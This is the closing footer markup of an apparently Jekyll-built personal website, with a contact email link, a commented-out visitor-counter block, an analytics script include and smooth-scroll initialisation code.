            <a href="mailto:jirairya404@gmail.com" title="email"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>        
            
        </p>
        <!--
        <p>
            本站总访问量<span id="busuanzi_value_site_pv"></span>次，本站访客数<span id="busuanzi_value_site_uv"></span>人次，本文总阅读量<span id="busuanzi_value_page_pv"></span>次
        </p>
    -->
        <p class="power">
            <span>
                Site powered by <a href="https://jekyllrb.com/">Jekyll</a>
            </span>
        </p>
    </div>
</footer>
<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <div class="back-to-top">
    <a href="#top" data-scroll>
        <i class="fa fa-arrow-up" aria-hidden="true"></i>
    </a>
</div>

    <script src=" /js/main.js " charset="utf-8"></script>
    <script src=" /js/smooth-scroll.min.js " charset="utf-8"></script>
    <script type="text/javascript">
      smoothScroll.init({
        speed: 500, // Integer. How fast to complete the scroll in milliseconds
        easing: 'easeInOutCubic', // Easing pattern to use
        offset: 20, // Integer. How far to offset the scrolling anchor location in pixels
      });
    </script>
    <!-- <script src=" /js/scroll.min.js " charset="utf-8"></script> -->
  </body>

</html>
